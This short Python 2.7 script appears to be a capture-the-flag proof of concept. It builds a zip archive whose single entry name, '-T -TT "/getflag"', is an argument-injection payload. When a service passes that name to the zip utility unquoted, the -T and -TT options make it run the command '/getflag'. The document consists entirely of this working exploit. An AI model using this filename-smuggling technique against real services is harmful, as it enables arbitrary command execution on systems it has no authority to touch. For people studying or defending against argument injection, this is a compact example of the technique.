#!/usr/bin/python2.7
import zipfile
from cStringIO import StringIO 

def create_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('-T -TT "/getflag"', '')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()
